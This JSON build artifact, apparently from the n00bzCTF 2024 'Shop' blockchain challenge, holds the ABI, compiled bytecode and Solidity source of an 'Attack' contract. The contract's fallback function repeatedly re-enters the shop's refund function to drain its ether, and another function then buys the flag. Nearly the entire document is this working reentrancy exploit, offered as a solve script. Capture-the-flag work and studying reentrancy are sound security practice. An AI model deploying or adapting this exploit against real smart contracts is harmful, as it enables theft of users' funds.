{
  "contractName": "Attack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_shopAddress",
          "type": "address"
        }
      ],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "shop",
      "outputs": [
        {
          "internalType": "contract Shop",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "refund",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "solve",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "deposit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "buy",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "buyflag",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "RetrieveEth",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405260405161047b38038061047b8339818101604052602081101561002657600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506103f4806100876000396000f3fe6080604052600436106100745760003560e01c8063890d69081161004e578063890d690814610133578063a6f2ae3a1461013d578063b46a207914610147578063d0e30db01461015e57610075565b80630881fa0d146100c857806313460b701461011f578063590e1ae31461012957610075565b5b683635c9adc5dea000006000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106100c6576100c5610168565b5b005b3480156100d457600080fd5b506100dd610201565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b610127610226565b005b610131610168565b005b61013b6102c8565b005b6101456102d2565b005b34801561015357600080fd5b5061015c610373565b005b6101666103bc565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635af36e3e60008060016040518463ffffffff1660e01b815260040180838152602001828152602001925050506000604051808303818588803b1580156101e657600080fd5b505af11580156101fa573d6000803e3d6000fd5b5050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d6febde868487a9a304539440000600360016040518463ffffffff1660e01b815260040180838152602001828152602001925050506000604051808303818588803b1580156102ad57600080fd5b505af11580156102c1573d6000803e3d6000fd5b5050505050565b6102d0610226565b565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d6febde8674563918244f40000600060016040518463ffffffff1660e01b815260040180838152602001828152602001925050506000604051808303818588803b15801561035857600080fd5b505af115801561036c573d6000803e3d6000fd5b5050505050565b3373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156103b9573d6000803e3d6000fd5b50565b56fea2646970667358221220633705939168d41173b8dfae9b5e518e97e05647db2125a2452178f0ef0b5b5864736f6c63430006000033",
  "source": "import \"./Shop.sol\";\ncontract Attack {\n     Shop public shop;\n    constructor(address _shopAddress) public payable {\n        shop = Shop(_shopAddress);\n    }\n\n    function refund() public payable { \n        shop.refund.value(0 ether)(0,1);\n    }\n    function solve() public payable {\n    buyflag();\n    //shop.reset();\n    //shop.buy.value(5 ether)(0,1);\n    //refund();\n        \n    } \n    function deposit() public payable{\n        // Use this to deposit some money in Remix IDE (for testing).\n    }\n    function buy() public payable {\n        shop.buy.value(5 ether)(0,1);\n    }\n    function buyflag() public payable {\n        shop.buy.value(1337 ether)(3,1);\n}\n    function RetrieveEth() public {\n        msg.sender.transfer(address(this).balance); // Get the deposited money back to Remix wallet (for testing).\n    }\n    \n    fallback () external payable{ \n     if (address(shop).balance >= 1000 ether) { \n            refund();\n     }   \n    }\n}\n",
  "sourcePath": "/home/noobmaster/n00bzUnit3d/n00bzCTF2024/challenges/Blockchain/Shop/solve/contracts/Exploit.sol",
  "compiler": {
    "name": "solc",
    "version": "0.6.0+commit.26b70077.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-08-04T18:09:56.325Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}